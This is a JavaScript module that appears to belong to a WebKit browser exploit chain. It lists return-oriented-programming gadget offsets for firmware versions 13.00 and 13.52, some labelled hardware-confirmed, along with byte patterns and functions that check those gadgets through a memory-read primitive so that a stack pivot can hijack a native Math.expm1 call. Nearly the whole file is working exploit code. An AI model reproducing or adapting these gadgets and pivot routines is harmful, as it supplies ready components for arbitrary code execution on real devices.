/**
 * Pivot/call chain gadgets for Math.expm1 native call.
 * 13.00 RVAs are scan hints only — NOT valid on 13.52 until HW-verified or scanned.
 */

/** 13.00 proven row — use as scan hints near-search only */
export const PIVOT_HINTS_1300 = {
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x548b,
    wk_PUSH_RDX_POP_RSP_RET:      0x2abccaa,
    wk_MOV_RDI_RSI_30_CALL:       0x295f948,
    wk_POP_RAX_MOV_RAX_JMP_18:    0x1d989e3,
    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x25bae0,
    wk_MOV_RDI_RAX_8_CALL_20:     0x4a0406,
    wk_MOV_RDX_RAX_18_CALL_10:    0x1ec3ada,
    pivot_view_sp:                0x38,
};

/** 13.52 retail — HW-confirmed pivot RVAs */
export const PIVOT_HW_1352 = {
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1f9bb,
    wk_MOV_RDI_RSI_30_CALL:       0xe3e4a,
    wk_POP_RAX_MOV_RAX_JMP_18:    0x4b330,
    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x1ff70,
    wk_MOV_RDI_RAX_8_CALL_20:     0x16e02,
    wk_MOV_RDX_RAX_18_CALL_10:    0x589c1,
    // G5 wk_PUSH_RDX_POP_RSP_RET — still scan (low .text only)
};

export function pivotHint(key) {
    if (PIVOT_HW_1352[key] != null) return PIVOT_HW_1352[key];
    return PIVOT_HINTS_1300[key] || 0;
}

/** Rows: [label, offsetKey, bytePattern] */
export const PIVOT_ROWS = [
    ["MOV_RDI_RAX", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

export const PIVOT_KEYS = PIVOT_ROWS.map(r => r[1]);

export function pivotPattern(row, off) {
    const label = row[0];
    let pat = row[2];
    if (label === "G4" && off && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    return pat;
}

export function checkPivotBytes(read1, base, rva, pat) {
    if (rva == null || !base) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1(a.add32(i));
        if (b == null || (b & 0xff) !== pat[i]) return false;
    }
    return true;
}

export function verifyPivotSet(read1, base, off) {
    const good = [];
    const bad = [];
    const missing = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const row = PIVOT_ROWS[i];
        const key = row[1];
        const rva = off[key];
        const pat = pivotPattern(row, off);
        if (rva == null) {
            missing.push(row[0]);
            continue;
        }
        if (checkPivotBytes(read1, base, rva, pat))
            good.push(row[0]);
        else
            bad.push(row[0]);
    }
    return {
        ok: bad.length === 0 && missing.length === 0,
        good,
        bad,
        missing,
        count: good.length,
        total: PIVOT_ROWS.length,
    };
}

export function mergeScannedPivot(off, scanned) {
    if (!scanned || typeof scanned !== "object") return off;
    const out = Object.assign({}, off, PIVOT_HW_1352);
    for (let i = 0; i < PIVOT_KEYS.length; i++) {
        const key = PIVOT_KEYS[i];
        if (scanned[key] != null) out[key] = scanned[key];
    }
    if (scanned.pivot_view_sp != null)
        out.pivot_view_sp = scanned.pivot_view_sp;
    else if (out.pivot_view_sp == null)
        out.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
    return out;
}

export function loadScannedPivot() {
    try {
        const raw = sessionStorage.getItem("wk-scanned-pivot");
        if (!raw) return null;
        return JSON.parse(raw);
    } catch (_) {
        return null;
    }
}

export function saveScannedPivot(base, found) {
    try {
        sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found));
        sessionStorage.setItem("wk-scanned-pivot-base", String(base));
    } catch (_) { }
}
